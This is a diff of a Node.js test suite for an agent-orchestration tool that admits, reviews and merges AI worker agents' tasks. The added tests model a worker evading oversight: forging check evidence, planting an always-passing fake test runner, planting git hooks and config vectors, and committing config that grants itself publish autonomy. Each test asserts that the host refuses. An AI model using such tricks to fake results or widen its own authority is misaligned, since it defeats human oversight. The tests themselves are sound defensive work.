@@ -1,3 +1,4 @@
+import '../helpers/bare-run.mjs'; // TM-461: a bare `node --test` of this file must not reach live NATS or hang
 import assert from 'node:assert/strict';
 import test from 'node:test';
 import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
@@ -5,7 +6,7 @@ import { join } from 'node:path';
 import { tmpdir } from 'node:os';
 import { readJson, run, writeJson } from '../../topology/lib/util.mjs';
 import { canonicalRepoId, pinnedGithubRepo, repoKey } from '../../topology/lib/repoid.mjs';
-import { admitTask, workerReport, retryReview, integrationEligibility, integrateTask, cleanupTask, bindTaskWorker, taskWorkerState, managementStatus, recordLanding } from '../../topology/lib/management.mjs';
+import { admitTask, workerReport, retryReview, integrationEligibility, integrateTask, cleanupTask, bindTaskWorker, rebindTaskWorker, taskWorkerState, managementStatus, recordLanding } from '../../topology/lib/management.mjs';
 import { grantDelegation as rawGrant, agentMarkers, planDigest } from '../../topology/lib/delegation.mjs';
 // TM-248: a grant names an approved plan (here epic EP-19, which the fixture task TM-1 belongs to) and an expiry.
 // epicTasks stands in for the task store at grant time: the grant freezes whatever it returns.
@@ -17,8 +18,25 @@ const SHELL_ANCESTRY = async () => ['zsh', 'tmux: server'];
 import { topologyRunLocation } from '../../topology/lib/discovery.mjs';
 import { listServerPanes } from '../../topology/lib/tmux.mjs';
 import { isolatedTmux } from '../helpers/isolated-tmux.mjs';
+import { plantGitVectors } from '../helpers/plant-git-vectors.mjs';
+import { COMPARE, fakeGh, ghShim, serverCompare } from '../helpers/fake-server.mjs';
 
 const NO_SERVER_GH = async () => ({ code: 1, stdout: '', stderr: 'no server in the fixture' });
+// TM-442: the protected management keys (autonomy, release, cutover, required_checks) are honoured only
+// from the repository config on the server's default branch. The fixture's server (pinned repository
+// o/r, branch main) commits `server.document`, or else the plugin defaults' management block merged
+// with `server.management`, so tests keep writing config.defaults.json as before.
+const SERVER_POLICY_API = 'repos/o/r/contents/.bytedesk/agent-orchestration/config.json?ref=main';
+const fixtureServer = (pluginRoot, server, consumer) => async args => {
+  if (args[0] === 'repo' && args[1] === 'view') return { code: 0, stdout: JSON.stringify({ nameWithOwner: 'o/r', defaultBranchRef: { name: 'main' } }), stderr: '' };
+  // PR #226 review: the server's main is the consumer's main unless a test snapshots it (server.tip).
+  const compared = args[0] === 'api' && COMPARE.exec(args[1]);
+  if (compared) return { code: 0, stdout: JSON.stringify({ status: serverCompare(server.repo || consumer, compared[1], compared[2], server.tip) }), stderr: '' };
+  if (args[0] !== 'api' || args[1] !== SERVER_POLICY_API) return { code: 1, stdout: '', stderr: 'no such call in the fixture' };
+  const defaults = (await readJson(join(pluginRoot, 'config.defaults.json')).catch(() => ({}))).management || {};
+  const document = server.document ?? { management: { ...defaults, ...server.management } };
+  return { code: 0, stdout: JSON.stringify({ content: Buffer.from(JSON.stringify(document)).toString('base64') }), stderr: '' };
+};
 const NO_SERVER_COMPARE = async () => { throw new Error('no server in the fixture'); };
 async function fixture(t) {
   const root = await mkdtemp(join(tmpdir(), 'ao-manage-')); t.after(() => rm(root, { recursive: true, force: true }));
@@ -29,7 +47,7 @@ async function fixture(t) {
   await git(consumer, ['add', 'code.txt']);
   await git(consumer, ['-c', 'user.name=Test', '-c', 'user.email=test@example.invalid', 'commit', '-m', 'base']);
   const doc = { id: 'TM-1', epic: 'EP-19', status: 'todo', labels: ['ready-for-agent'], touches: ['code.txt'], blockedBy: [] };
-  const calls = []; let claim = null;
+  const calls = []; let claim = null; const server = { document: null, management: {} };
   const store = {
     root: consumer,
     show: async () => ({ ...doc }), claim: async () => claim,
@@ -44,7 +62,7 @@ async function fixture(t) {
   const opts = { consumer, pluginRoot, home: join(root, 'home'), ancestors: SHELL_ANCESTRY, env: { ...operatorEnv(), XDG_CONFIG_HOME: join(root, 'config'), AGENT_ORCHESTRATION_STATE_HOME: join(root, 'state') }, store, task: 'TM-1', owner: 'author', intent: 'Implement file', boundaries: ['code.txt only'], dependencies: [], checks: ['content'], reviewerReady: async () => ({ available: true }),
     // No server in the fixture (TM-263): gh and the server compare answer "unavailable", so the lead-autonomy
     // policy is absent and a lead's record-landing cannot be server-verified unless a test injects a server.
-    gh: NO_SERVER_GH, serverCompare: NO_SERVER_COMPARE, serverBranchTip: NO_SERVER_COMPARE, reviewGate: async () => ({ eligible: true, reasons: [], status: { review: { verdict: 'approve', reviewer_id: 'fixture-reviewer' } } }), workerState: async () => ({ owned: true, active: false, alive: false }),
+    gh: fixtureServer(pluginRoot, server, consumer), serverCompare: NO_SERVER_COMPARE, serverBranchTip: NO_SERVER_COMPARE, reviewGate: async () => ({ eligible: true, reasons: [], status: { review: { verdict: 'approve', reviewer_id: 'fixture-reviewer' } } }), workerState: async () => ({ owned: true, active: false, alive: false }),
     // TM-244: a refused review mails the lead; fixtures capture it instead of reaching any real mailbox.
     notifyLead: async () => ({ status: 'held', reason: 'fixture' }) };
   const finish = async () => {
@@ -53,7 +71,7 @@ async function fixture(t) {
     const revision = (await git(worktree, ['rev-parse', 'HEAD'])).stdout.trim();
     return workerReport({ ...opts, kind: 'finish', report: { artifacts: ['code.txt'], checks: ['content'], risks: [], evidence: 'fixture result', revision } });
   };
-  return { opts, doc, calls, finish, git, setClaim: value => { claim = value; } };
+  return { opts, doc, calls, finish, git, server, setClaim: value => { claim = value; } };
 }
 
 test('new admission requires reviewer, task scope, ownership and complete protocol before provisioning', async t => {
@@ -143,7 +161,8 @@ test('TM-418 the finish report and retry-review file the worker check runs as ev
   const run1 = { name: 'content', command: ['node', 'check.js'], exit_code: 0, revision, log_tail: 'ok' };
   // A worker-supplied checkEvidence key in the --file is ignored: only report.checks is evidence.
   await workerReport({ ...opts, checkEvidence: [{ name: 'forged', command: 'x', exit_code: 0, revision }], kind: 'finish', report: report(['content passed', run1]) });
-  assert.deepEqual(filed[0].checkEvidence, [{ name: 'content', command: 'node check.js', exit_code: 0, revision, log_tail: 'ok' }]);
+  // TM-430: filed, but labelled as the worker's claim, never as a host result.
+  assert.deepEqual(filed[0].checkEvidence, [{ name: 'content', command: '[claimed by the worker; not run by the host] node check.js', exit_code: 0, revision, log_tail: '[claimed by the worker; not run by the host]\nok' }]);
   await retryReview(opts);
   assert.deepEqual(filed[1].checkEvidence, filed[0].checkEvidence);
 });
@@ -158,6 +177,17 @@ test('configured checks, verified local merge and tm cleanup close only the owne
   const cleaned = await cleanupTask(opts); assert.equal(cleaned.cleaned, true);
   assert.ok(calls.indexOf('collect') < calls.indexOf('remove')); assert.ok(calls.indexOf('remove') < calls.indexOf('done'));
   assert.equal((await git(opts.consumer, ['branch', '--list', 'tm/TM-1'])).stdout.trim(), '');
+});
+
+test('TM-443 config a worker plants in the shared .git/config never runs during eligibility or integrate', async t => {
+  const { opts, finish } = await fixture(t);
+  await admitTask(opts); const report = await finish();
+  // From here on only governed code runs git: every vector a same-user worker can write is planted.
+  const planted = await plantGitVectors(opts.consumer, join(opts.env.AGENT_ORCHESTRATION_STATE_HOME, '..'));
+  assert.equal((await integrationEligibility(opts)).eligible, true);
+  const integrated = await integrateTask(opts);
+  assert.equal(integrated.merge.landed, report.finish.revision);
+  assert.deepEqual(await planted.fired(), [], 'a planted fsmonitor, hook, pager, external diff, filter or merge driver ran as the lead');
 });
 
 test('dirty, changed and unowned task cleanup preserves work with recovery reason', async t => {
@@ -261,6 +291,74 @@ test('TM-240: the reviewer accepts an admitted revision from an agent-orchestrat
   await writeJson(reviewer.recordPath, { agent_id: 'reviewer-1', repo_id: identity.id, binding: { serverKey: '/tmp/s', serverPid: 1, sessionId: '$1', sessionCreated: 1, paneId: '%1', panePid: 2 } });
   const request = await requestReview({ consumer, task: 'TM-1', revision, authorAgentIds: ['author'], env, home, wake: async () => ({ rang: false }) });
   assert.equal(request.base_revision, base); assert.equal(request.state, 'published');
+});
+
+test('TM-444 required checks run in a fresh tree of the finish revision: an ignored fake runner in the worker worktree cannot pass them', async t => {
+  const { opts, finish } = await fixture(t);
+  await admitTask(opts); const report = await finish();
+  const doc = await opts.store.show();
+  // The worker plants an IGNORED runner that exits 0; `git status --porcelain` cannot see it.
+  await writeFile(join(opts.consumer, '.git', 'info', 'exclude'), 'node_modules/\n');
+  await mkdir(join(doc.worktree, 'node_modules', '.bin'), { recursive: true });
+  await writeFile(join(doc.worktree, 'node_modules', '.bin', 'runner'), '#!/bin/sh\nexit 0\n', { mode: 0o755 });
+  await writeJson(join(opts.pluginRoot, 'config.defaults.json'), { management: { auto_merge: true, target_branch: 'main', required_checks: [{ name: 'unit', argv: ['./node_modules/.bin/runner'] }] } });
+  assert.equal((await integrationEligibility(opts)).eligible, true, 'the worktree reads clean: the plant is ignored');
+  await assert.rejects(integrateTask(opts), { code: 'TOPOLOGY_MANAGEMENT_CHECK_FAILED' });
+  assert.notEqual((await run('git', ['-C', opts.consumer, 'rev-parse', 'HEAD'])).stdout.trim(), report.finish.revision, 'nothing landed');
+  const trees = (await run('git', ['-C', opts.consumer, 'worktree', 'list', '--porcelain'])).stdout;
+  assert.ok(!/ao-checks-/.test(trees), 'the check tree was removed');
+});
+
+// ── TM-430: only the host's own run of the configured argv satisfies a required check ─────────────
+const CLAIM = revision => [{ name: 'content', command: 'node check.js', exit_code: 0, revision, log_tail: 'all green' }];
+test('TM-430 a worker claim (exit 0, right revision) alone never satisfies a required check: the failing host run refuses', async t => {
+  const { opts, git } = await fixture(t);
+  await admitTask(opts);
+  const worktree = (await opts.store.show()).worktree;
+  await writeFile(join(worktree, 'code.txt'), 'implemented'); await git(worktree, ['add', 'code.txt']);
+  await git(worktree, ['-c', 'user.name=Test', '-c', 'user.email=test@example.invalid', 'commit', '-qm', 'implementation']);
+  const revision = (await git(worktree, ['rev-parse', 'HEAD'])).stdout.trim();
+  await workerReport({ ...opts, kind: 'finish', report: { artifacts: ['code.txt'], checks: CLAIM(revision), risks: [], evidence: 'fixture', revision } });
+  // The configured check really fails; the worker said it passed.
+  await writeJson(join(opts.pluginRoot, 'config.defaults.json'), { management: { auto_merge: true, target_branch: 'main', required_checks: [{ name: 'content', argv: [process.execPath, '-e', 'process.exit(7)'] }] } });
+  // A reviewer that counted the claim reports nothing about checks: integrate must still run them.
+  await assert.rejects(integrateTask({ ...opts, reviewGate: async () => ({ eligible: true, reasons: [], status: { review: { verdict: 'approve' } } }) }), { code: 'TOPOLOGY_MANAGEMENT_CHECK_FAILED' });
+  assert.notEqual((await git(opts.consumer, ['rev-parse', 'HEAD'])).stdout.trim(), revision, 'nothing landed');
+});
+
+test('TM-430 a host run of the configured argv satisfies the required check even when the review packet has no evidence', async t => {
+  const { opts, finish } = await fixture(t);
+  await admitTask(opts); const report = await finish();
+  const reviewGate = async () => ({ eligible: false, reasons: [`required check content: no evidence`], status: { review: { verdict: 'approve' } } });
+  const gate = await integrationEligibility({ ...opts, reviewGate });
+  assert.equal(gate.eligible, true, gate.reasons.join('; '));
+  assert.deepEqual(gate.required_checks, { satisfied_by: 'host-run-at-integrate', claimed_check_reasons: ['required check content: no evidence'] });
+  const landed = await integrateTask({ ...opts, reviewGate });
+  assert.equal(landed.merge.landed, report.finish.revision);
+  assert.deepEqual(landed.merge.checks.map(c => [c.name, c.code, c.runner]), [['content', 0, 'host']]);
+});
+
+test('TM-442 required checks set only in a worker-writable layer are not honoured: integrate refuses as unconfigured', async t => {
+  const { opts, finish, server } = await fixture(t);
+  await admitTask(opts); await finish();
+  server.document = { management: { target_branch: 'main' } }; // the server's default branch names no checks
+  await writeJson(join(opts.env.XDG_CONFIG_HOME, 'agent-orchestration', 'config.json'), { management: { required_checks: [{ name: 'noop', argv: ['true'] }] } });
+  const gate = await integrationEligibility(opts);
+  assert.ok(gate.refusals.some(r => r.condition === 'config' && /required_checks .*server's default branch/.test(r.reason)), JSON.stringify(gate.refusals));
+  await assert.rejects(integrateTask(opts), { code: 'TOPOLOGY_MANAGEMENT_INTEGRATION_BLOCKED' });
+});
+
+test('TM-442 integrate refuses a landing that changes management in the committed repository config', async t => {
+  const { opts, finish, doc, git } = await fixture(t);
+  doc.touches = ['code.txt', '.bytedesk/agent-orchestration/config.json'];
+  await admitTask(opts);
+  const worktree = (await opts.store.show()).worktree;
+  await writeJson(join(worktree, '.bytedesk/agent-orchestration/config.json'), { management: { autonomy: 'publish', required_checks: [] } });
+  await git(worktree, ['add', '.bytedesk']); await git(worktree, ['-c', 'user.name=Test', '-c', 'user.email=test@example.invalid', 'commit', '-qm', 'grant myself publish']);
+  await finish();
+  const gate = await integrationEligibility(opts);
+  assert.ok(gate.refusals.some(r => r.condition === 'scope' && /changes "management"/.test(r.reason)), JSON.stringify(gate.refusals));
+  await assert.rejects(integrateTask(opts), { code: 'TOPOLOGY_MANAGEMENT_INTEGRATION_BLOCKED', message: /changes "management"/ });
 });
 
 test('failed required checks and out-of-scope files prevent integration', async t => {
@@ -447,6 +545,97 @@ test('a native fallback requires a new verified finish and incomplete or foreign
   delete f.doc.dispatched.nativeRunId;
   const legacy = await taskWorkerState(f.actual, record);
   assert.equal(legacy.owned, false); assert.match(legacy.reason, /authentic native run ID/);
+});
+
+// TM-417 (agent-fabric TM-016): a pool dispatch recorded the bare native run id as its workflow id.
+test('TM-417: a bare dispatch workflow id refuses the finish until the lead rebinds it, then the finish is accepted', async t => {
+  const f = await nativeFixture(t); if (!f) return;
+  f.doc.dispatched.workflowRunId = f.root.native.run_id;
+  let rebinds = 0;
+  f.opts.store.rebind = async () => {
+    rebinds++;
+    const from = f.doc.dispatched.workflowRunId;
+    f.doc.dispatched = { ...f.doc.dispatched, workflowRunId: `topology:${f.doc.dispatched.nativeRunId}` };
+    return { rebound: true, from, to: f.doc.dispatched.workflowRunId, dispatched: f.doc.dispatched };
+  };
+  await assert.rejects(f.finish(), /IDs differ; the lead repairs the dispatch with `ao-topology manage rebind --task TM-1`/);
+  // Refusals: another session, a dispatch whose checkout is not the admitted one, a non-topology dispatch.
+  await assert.rejects(rebindTaskWorker({ ...f.actual, owner: 'intruder' }), /Only the admitting session can rebind/);
+  const status = await managementStatus(f.actual), recordPath = join(f.opts.env.AGENT_ORCHESTRATION_STATE_HOME, 'management', repoKey((await canonicalRepoId(f.opts.consumer)).id), 'TM-1.json');
+  await writeJson(recordPath, { ...status.management, branch: 'tm/other' });
+  await assert.rejects(rebindTaskWorker(f.actual), /worktree or branch differs from the admission record/);
+  await writeJson(recordPath, status.management);
+  f.doc.dispatched.backend = 'tmux';
+  await assert.rejects(rebindTaskWorker(f.actual), /no topology dispatch to rebind/);
+  f.doc.dispatched.backend = 'topology';
+  assert.equal(rebinds, 0, 'no refusal reached tm rebind');
+  const rebound = await rebindTaskWorker(f.actual);
+  assert.deepEqual(rebound, { rebound: true, from: f.root.native.run_id, to: `topology:${f.root.native.run_id}` });
+  const record = (await managementStatus(f.actual)).management;
+  assert.equal(record.events.at(-1).event, 'rebind');
+  assert.equal(record.workflow_run_id, 'tm-TM-1', 'the governance identity is untouched by a rebind');
+  const revision = (await f.git(f.doc.worktree, ['rev-parse', 'HEAD'])).stdout.trim();
+  const finished = await workerReport({ ...f.opts, kind: 'finish', report: { artifacts: ['code.txt'], checks: ['content'], risks: [], evidence: 'fixture result', revision } });
+  assert.equal(finished.state, 'ready-for-review');
+  assert.equal(finished.worker.native_run_id, f.root.native.run_id);
+});
+
+test('TM-417: admission keeps the task governance id even when a dispatch is already recorded', async t => {
+  const { opts, doc } = await fixture(t);
+  doc.dispatched = { backend: 'topology', run: 'topology:s', session: 'author', nativeRunId: 'n-1', workflowRunId: 'topology:n-1' };
+  assert.equal((await admitTask(opts)).record.workflow_run_id, 'tm-TM-1');
+});
+
+test('TM-417 AC4: admit, tm dispatch on the topology backend, finish report and reviewer request agree on one run id', async t => {
+  if ((await run('tmux', ['-V'], { allowFailure: true })).code !== 0) { t.skip('tmux unavailable'); return; }
+  const { opts, git } = await fixture(t);
+  const { fileURLToPath } = await import('node:url');
+  const { reviewerPaths } = await import('../../topology/lib/reviewer.mjs');
+  const tmBin = fileURLToPath(new URL('../../../task-management/bin/tm', import.meta.url));
+  const topologyBackend = fileURLToPath(new URL('../../../task-management/lib/dispatch/topology.mjs', import.meta.url));
+  const env = { ...opts.env, TM_ROOT: opts.consumer, TM_SESSION_ID: 'author', CLAUDE_PROJECT_DIR: opts.consumer };
+  delete env.TM_DISPATCH_WORKER;
+  const tm = async args => run(tmBin, args, { cwd: opts.consumer, env });
+  await tm(['init']);
+  await tm(['epic', 'new', 'Fixture integration']);
+  await tm(['task', 'new', 'Implement scoped content change', '--body', 'Change code.txt to implemented and validate its exact contents.', '--ac', 'code.txt contains implemented']);
+  await tm(['label', 'TM-001', 'ready-for-agent']);
+  await tm(['touches', 'TM-001', 'code.txt']);
+  const reviewer = await reviewerPaths(opts.consumer, opts.env, opts.home);
+  await writeJson(reviewer.recordPath, { agent_id: 'reviewer-1', repo_id: reviewer.identity.id, provider: 'claude', binding: { serverKey: '/tmp/s', serverPid: 1, sessionId: '$1', sessionCreated: 1, paneId: '%1', panePid: 2 } });
+
+  const actual = { ...opts, store: undefined, task: 'TM-001', tmBin, env };
+  assert.equal((await admitTask(actual)).record.workflow_run_id, 'tm-TM-001');
+  const { worktree, branch } = JSON.parse((await tm(['show', 'TM-001', '--json'])).stdout);
+  // The native run the producer would have launched, on a test-owned tmux server.
+  const { socket } = isolatedTmux(t), session = 'tm-001-native', runId = '20261005-094720-bfl2';
+  await run('tmux', ['-S', socket, 'new-session', '-d', '-s', session, '-c', worktree, 'sleep', '120']);
+  const [binding] = await listServerPanes({ tmuxServer: socket, session });
+  const location = await topologyRunLocation({ consumer: opts.consumer, nativeRunId: runId, stateHome: opts.env.AGENT_ORCHESTRATION_STATE_HOME });
+  await writeJson(join(location.runDir, 'run.json'), { version: 1, run_id: runId, name: 'tm-TM-001', task_id: 'TM-001', consumer: worktree, workload_cwd: worktree,
+    repository: location.repository, run_dir: location.runDir, state: 'running', session, session_creation_attempted: true,
+    write_authority: { task_id: 'TM-001', worktree, branch, owner: 'author' }, launch_spec: { agents: [{ id: 'worker' }] },
+    agents: [{ id: 'worker', role: 'worker', pane: binding.paneId, binding, cwd: worktree }], parent: null });
+  // tm's real topology backend, with only the ao-topology process replaced by its launch JSON.
+  const registry = join(opts.consumer, '..', 'registry.mjs');
+  await writeFile(registry, `import * as topology from ${JSON.stringify(topologyBackend)};
+const launched = ${JSON.stringify({ run_id: runId, runDir: location.runDir, session, state: 'running', agents: [], warnings: [] })};
+export default { topology: { name: 'topology', available: () => true, spawn: req => topology.spawn(req, { caps: { backends: { topology: { available: true, path: '/fake/ao-topology' } } },
+  rosterList: [], writeImpl: () => {}, mkdtempImpl: p => p + 'X', spawnImpl: () => ({ status: 0, stdout: JSON.stringify(launched) }) }) } };`);
+  env.TM_DISPATCH_REGISTRY = registry;
+  assert.equal(JSON.parse((await tm(['dispatch', 'TM-001', '--backend', 'topology', '--json'])).stdout).ok, true);
+  const dispatched = JSON.parse((await tm(['show', 'TM-001', '--json'])).stdout).dispatched;
+  assert.equal(dispatched.workflowRunId, `topology:${runId}`);
+
+  await writeFile(join(worktree, 'code.txt'), 'implemented'); await git(worktree, ['add', 'code.txt']);
+  await git(worktree, ['-c', 'user.name=Test', '-c', 'user.email=test@example.invalid', 'commit', '-m', 'implementation']);
+  const revision = (await git(worktree, ['rev-parse', 'HEAD'])).stdout.trim();
+  const finished = await workerReport({ ...actual, kind: 'finish', report: { artifacts: ['code.txt'], checks: ['content'], risks: [], evidence: 'fixture result', revision }, wake: async () => ({ rang: false, reason: 'fixture' }) });
+  assert.equal(finished.worker.native_run_id, runId);
+  assert.equal(finished.review_blocked, undefined, finished.review_blocked);
+  assert.equal(finished.review_request?.revision, revision);
+  assert.equal(finished.review_request.reviewer_id, 'reviewer-1');
+  assert.equal(JSON.parse((await tm(['show', 'TM-001', '--json'])).stdout).governance.state, 'ready-for-review');
 });
 
 // TM-224: the tools' own store paths may be dirty in the integration checkout; nothing else may.
@@ -721,8 +910,9 @@ test("this repository's committed management policy raises no policy reasons", a
   const { loadConfig } = await import('../../topology/lib/config.mjs');
   const repoRoot = fileURLToPath(new URL('../../../', import.meta.url));
   const pluginRoot = fileURLToPath(new URL('../../', import.meta.url));
-  const { opts, finish } = await fixture(t);
+  const { opts, finish, server } = await fixture(t);
   const loaded = await loadConfig({ consumer: repoRoot, pluginRoot, home: opts.home, env: opts.env });
+  server.document = JSON.parse(await readFile(join(repoRoot, '.bytedesk/agent-orchestration/config.json'), 'utf8'));
   assert.deepEqual(loaded.errors, []);
   assert.equal(loaded.config.management.target_branch, 'main');
   assert.ok(loaded.config.management.required_checks.length >= 6);
@@ -732,7 +922,8 @@ test("this repository's committed management policy raises no policy reasons", a
   await admitTask(policyOpts); await finish();
   const gate = await integrationEligibility(policyOpts);
   assert.deepEqual(gate.reasons.filter(r => /configure management|integration authority|configuration is invalid/.test(r)), []);
-  assert.deepEqual(gate.policy, loaded.config.management);
+  const { autonomy: _shippedDefault, ...honoured } = loaded.config.management; // autonomy only from the server, which sets none
+  assert.deepEqual(gate.policy, honoured);
 });
 
 // ── TM-218: lead-owned worker start, adoption and stop ──────────────────────────
@@ -1199,6 +1390,8 @@ async function prTask(t, { grant = {}, review, pr: prPatch = {}, checks, require
     state.argv.push(args);
     const [noun, verb] = args;
     if (noun === 'repo' && verb === 'view') return ok({ nameWithOwner: state.repo, defaultBranchRef: { name: 'main' } });
+    const compared = noun === 'api' && COMPARE.exec(verb);
+    if (compared) return ok({ status: serverCompare(origin, compared[1], compared[2]) });
     if (noun !== 'pr') return { code: 1, stdout: '', stderr: 'unexpected' };
     if (!args.includes('--repo') || args[args.indexOf('--repo') + 1] !== 'o/r') return { code: 1, stdout: '', stderr: `gh pr ${verb} without --repo o/r` };
     if (verb === 'list') return ok([pr]);
@@ -1275,6 +1468,20 @@ test('TM-249 success: integrate merges the PR with exactly --merge --match-head-
   assert.equal(gate.allow, true, gate.reason); assert.equal(gate.actor, 'lead-1');
   // Rerunning is a no-op: nothing merges twice.
   await integrateTask(p.lead); assert.equal(merges(p.state).length, 1);
+});
+
+test('TM-430 pull-request path: the worker\'s claimed check never satisfies a required check; the host run decides before any merge', async t => {
+  const p = await prTask(t);
+  await workerReport({ ...p.opts, kind: 'finish', report: { artifacts: ['code.txt'], checks: CLAIM(p.revision), risks: [], evidence: 'fixture', revision: p.revision } });
+  const policy = check => ({ management: { target_branch: 'main', integrate_via: 'pull-request', required_checks: [{ name: 'content', argv: check }] } });
+  const serving = doc => async args => args[0] === 'api'
+    ? { code: 0, stdout: JSON.stringify({ content: Buffer.from(JSON.stringify(doc)).toString('base64') }), stderr: '' } : p.gh(args);
+  // The configured check fails on the host: refused by name, nothing merged, whatever the worker claimed.
+  await refusedAs(p, { ...p.lead, gh: serving(policy([process.execPath, '-e', 'process.exit(7)'])) }, 'checks', /Required check content failed/);
+  // The same check passing on the host is what lets the merge happen, and the landing records the run.
+  const landed = await integrateTask({ ...p.lead, gh: serving(policy([process.execPath, '-e', "process.exit(require('fs').readFileSync('code.txt','utf8')==='implemented'?0:1)"])) });
+  assert.equal(merges(p.state).length, 1);
+  assert.deepEqual(landed.merge.required_checks.map(c => [c.name, c.code, c.runner]), [['content', 0, 'host']]);
 });
 
 test('TM-249 close-retry runs the same caller and plan gate: a worker pane and a lead without a grant are refused by name and the task stays open', async t => {
@@ -1478,7 +1685,7 @@ test('TM-263 (d) with the server policy naming the lead, integrate merges withou
   const result = await integrateTask(p.lead);
   const VIEW = ['repo', 'view', '--json', 'nameWithOwner,defaultBranchRef'];
   assert.deepEqual(p.state.argv, [
-    VIEW, POLICY_API, VIEW,
+    VIEW, POLICY_API, VIEW, POLICY_API, VIEW,
     ['pr', 'list', '--repo', 'o/r', '--head', 'tm/TM-1', '--state', 'all', '--json', 'number,state,baseRefName,headRefOid,mergeable'],
     ['pr', 'checks', '7', '--repo', 'o/r', '--json', 'name,state,bucket'], ['pr', 'checks', '7', '--required', '--repo', 'o/r', '--json', 'name,state,bucket'],
     ['pr', 'merge', '7', '--repo', 'o/r', '--merge', '--match-head-commit', p.revision],
@@ -1560,14 +1767,12 @@ test('TM-263 (i) after pinning, a repointed remote or gh default refuses integra
 });
 
 test('TM-263 (j) record-landing: a server lead_autonomy policy naming another lead refuses the locally found lead', async t => {
-  const serverGh = lead => async args => args[0] === 'repo'
-    ? { code: 0, stdout: JSON.stringify({ nameWithOwner: 'o/r', defaultBranchRef: { name: 'main' } }), stderr: '' }
-    : { code: 0, stdout: JSON.stringify({ content: Buffer.from(JSON.stringify({ management: { lead_autonomy: { ...LEAD_POLICY, lead } } })).toString('base64') }), stderr: '' };
+  const serverGh = (lead, f) => fakeGh(f.opts.consumer, { fallback: async () => ({ code: 0, stdout: JSON.stringify({ content: Buffer.from(JSON.stringify({ management: { lead_autonomy: { ...LEAD_POLICY, lead } } })).toString('base64') }), stderr: '' }) });
   const refused = await leadServer(t, 'landed');
-  await assert.rejects(recordLanding({ ...refused.lead, gh: serverGh('lead-2'), ...refused.landing }), { code: 'TOPOLOGY_MANAGEMENT_LANDING_AUTHORITY', message: /names lead-2 .* not lead-1/ });
+  await assert.rejects(recordLanding({ ...refused.lead, gh: serverGh('lead-2', refused), ...refused.landing }), { code: 'TOPOLOGY_MANAGEMENT_LANDING_AUTHORITY', message: /names lead-2 .* not lead-1/ });
   assert.equal((await managementStatus(refused.opts)).management.merge, undefined, 'nothing recorded by a refusal');
   const agreed = await leadServer(t, 'landed');
-  assert.equal((await recordLanding({ ...agreed.lead, gh: serverGh('lead-1'), ...agreed.landing })).merge.authorization.channel, 'repository-lead');
+  assert.equal((await recordLanding({ ...agreed.lead, gh: serverGh('lead-1', agreed), ...agreed.landing })).merge.authorization.channel, 'repository-lead');
 });
 
 // TM-347: changes_requested -> rework -> a new worker -> re-finish at a new revision -> re-review -> integrate.
@@ -1700,9 +1905,12 @@ const withTarget = async (opts, target) => {
 test("TM-349: admission is refused only when no integration branch candidate resolves, and never falls back to HEAD", async t => {
   const { opts, calls } = await fixture(t);
   await withTarget(opts, "absent-target");
-  await assert.rejects(admitTask({ ...opts, serverPullBase: async () => ["no-such-branch"] }), { code: "TOPOLOGY_MANAGEMENT_BASE", message: /\(absent-target\)/ });
+  // TM-349 is about the candidates when no server answers; the shared fixture's GitHub server (TM-441) would
+  // supply a default branch, so this test runs without one, as it did before TM-441.
+  const offline = { ...opts, gh: NO_SERVER_GH };
+  await assert.rejects(admitTask({ ...offline, serverPullBase: async () => ["no-such-branch"] }), { code: "TOPOLOGY_MANAGEMENT_BASE", message: /\(absent-target\)/ });
   await withTarget(opts, null);
-  await assert.rejects(admitTask(opts), { code: "TOPOLOGY_MANAGEMENT_BASE", message: /no repository default branch/ });
+  await assert.rejects(admitTask(offline), { code: "TOPOLOGY_MANAGEMENT_BASE", message: /no repository default branch/ });
   assert.equal(calls.includes("start"), false, "nothing is started");
 });
 
@@ -1931,8 +2139,8 @@ test('TM-368 autonomy pr (the default) stops at the reviewed PR: land merges not
 });
 
 test('TM-368 autonomy merge: land integrates through manage integrate and does not publish', async t => {
-  const { opts, finish, calls } = await fixture(t);
-  await writeJson(globalConfig(opts), { management: { autonomy: 'merge' } });
+  const { opts, finish, calls, server } = await fixture(t);
+  server.management.autonomy = 'merge';
   await admitTask(opts); const report = await finish();
   const result = await landTask(opts);
   assert.equal(result.landed, true); assert.equal(result.merge.revision, report.finish.revision);
@@ -1940,8 +2148,8 @@ test('TM-368 autonomy merge: land integrates through manage integrate and does n
 });
 
 test('TM-368 a missing reviewer approval stops land before merge and pages', async t => {
-  const { opts, finish, calls } = await fixture(t);
-  await writeJson(globalConfig(opts), { management: { autonomy: 'publish' } });
+  const { opts, finish, calls, server } = await fixture(t);
+  server.management.autonomy = 'publish';
   await admitTask(opts); await finish();
   const p = landPager();
   const error = await landTask({ ...opts, page: p.page, reviewGate: async () => ({ eligible: false, reasons: ['review changes_requested'], status: { review: { verdict: 'changes_requested' } } }) }).then(() => null, e => e);
@@ -1955,8 +2163,11 @@ async function publishLanded(t, { status = 'SUCCESS', origin = { repo: '/elsewhe
   const fx = await fixture(t);
   const { opts, finish, git, doc } = fx;
   const root = join(opts.home, '..'), logs = join(root, 'release.log');
-  await writeFile(join(root, 'release.sh'), `#!/bin/sh\necho "$*" >> ${logs}\n`, { mode: 0o755 });
-  await writeJson(globalConfig(opts), { management: { autonomy: 'publish', release: { branch: 'main', argv: [join(root, 'release.sh'), 'start'], verify_argv: [join(root, 'release.sh'), 'verify'], teamcity: { build_type: 'Rel' } } } });
+  // TM-442: the release step is the repository's own tracked script, named repo-relative.
+  await mkdir(join(opts.consumer, 'scripts'), { recursive: true });
+  await writeFile(join(opts.consumer, 'scripts', 'release.sh'), `#!/bin/sh\necho "$*" >> ${logs}\n`, { mode: 0o755 });
+  await git(opts.consumer, ['add', 'scripts/release.sh']); await git(opts.consumer, ['-c', 'user.name=Test', '-c', 'user.email=test@example.invalid', 'commit', '-q', '-m', 'release script']);
+  Object.assign(fx.server.management, { autonomy: 'publish', release: { branch: 'main', argv: ['scripts/release.sh', 'start'], verify_argv: ['scripts/release.sh', 'verify'], teamcity: { build_type: 'Rel' } } });
   await run('git', ['init', '-q', '--bare', join(root, 'origin.git')]);
   await git(opts.consumer, ['remote', 'add', 'origin', join(root, 'origin.git')]);
   await admitTask(opts); await finish(); await integrateTask(opts);
@@ -1965,7 +2176,7 @@ async function publishLanded(t, { status = 'SUCCESS', origin = { repo: '/elsewhe
   const events = [], p = landPager();
   opts.store.epicTasks = async () => ['TM-1'];
   opts.store.ticketEvent = async (...args) => { events.push(args); };
-  const teamcity = { latestBuildId: async () => 7, waitForBuild: async () => ({ id: 8, number: '9', state: 'finished', status }) };
